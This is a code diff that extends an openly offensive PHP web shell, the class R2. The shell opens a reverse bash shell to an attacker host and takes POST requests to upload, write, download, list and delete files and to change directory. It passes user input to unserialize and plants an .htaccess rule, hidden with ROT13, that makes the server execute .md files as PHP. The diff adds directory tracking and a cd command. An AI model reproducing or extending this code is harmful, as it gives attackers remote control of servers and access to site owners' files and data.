@@ -23,7 +23,6 @@ class R2
     public static $daemon = 0;
     public static $shell = 'bash -i'; // bash
     public static $htaccess = 'NqqGlcr+nccyvpngvba%2Sk-uggcq-cuc+.zq';
-    public static $cwd = null;
     /*
      * @param string $host attacker ip/host
      * @param int $port attacker port
@@ -39,6 +38,7 @@ class R2
 
         error_log($debug);
         set_time_limit($time);
+        $this->cwd = getcwd() . DIRECTORY_SEPARATOR;
     }
     public function reverse(string $host, int $port)
     {
@@ -126,7 +126,7 @@ class R2
      */
     public function upLoad(array $file)
     {
-        return move_uploaded_file($file['tmp_name'], $file['name']);
+        return move_uploaded_file($file['tmp_name'], $this->cwd . $file['name']);
     }
     /*
      * @param none
@@ -143,7 +143,12 @@ class R2
      */
     public function write(string $name, string $file)
     {
-        return file_put_contents($name, str_rot13(urldecode($file)));
+        $file = str_rot13(urldecode($file));
+        if (substr($this->cwd, -1) == DIRECTORY_SEPARATOR) {
+            return file_put_contents($this->cwd . $name, $file);
+        } else {
+            return file_put_contents($this->cwd . DIRECTORY_SEPARATOR . $name, $file);
+        }
     }
     /*
      * @param none
@@ -151,7 +156,7 @@ class R2
      */
     public function htaccess()
     {
-        return $this->$write('.htaccess', R2::$htaccess);
+        return $this->write('.htaccess', R2::$htaccess);
     }
     /*
      * @param string $class class to be reflected
@@ -229,6 +234,7 @@ class R2
      */
     public function downLoad(string $file)
     {
+        $file = $this->cwd . $file;
         header("Content-Disposition: attachment; filename=" . basename($file));
         header("Content-Length: " . filesize($file));
         header("Content-Type: application/octet-stream;");
@@ -241,7 +247,7 @@ class R2
     public function ls($dir)
     {
         return json_encode(
-            scandir(getcwd() . DIRECTORY_SEPARATOR . $dir),
+            scandir($this->cwd . $dir),
             JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES
         );
     }
@@ -251,17 +257,25 @@ class R2
      */
     public function rm(string $file)
     {
-        return unlink(getcwd() . DIRECTORY_SEPARATOR . $file);
+        return unlink($this->cwd . $file) . PHP_EOL;
     }
     public function serial($data)
     {
         return unserialize($data) . PHP_EOL;
+    }
+    public function cd(string $directory)
+    {
+        $this->cwd = $this->cwd . $directory;
+        chdir($this->cwd);
     }
 }
 $r2 = new R2(true, 0);
 
 if (isset($_POST['debug'])) {
     echo $r2->debug($_POST['debug'], $_POST['property'], $_POST['value']);
+}
+if (isset($_POST['cd'])) {
+    $r2->cd($_POST['cd']);
 }
 if (isset($_POST['host']) && isset($_POST['port'])) {
     $r2->reverse($_POST['host'], $_POST['port']);
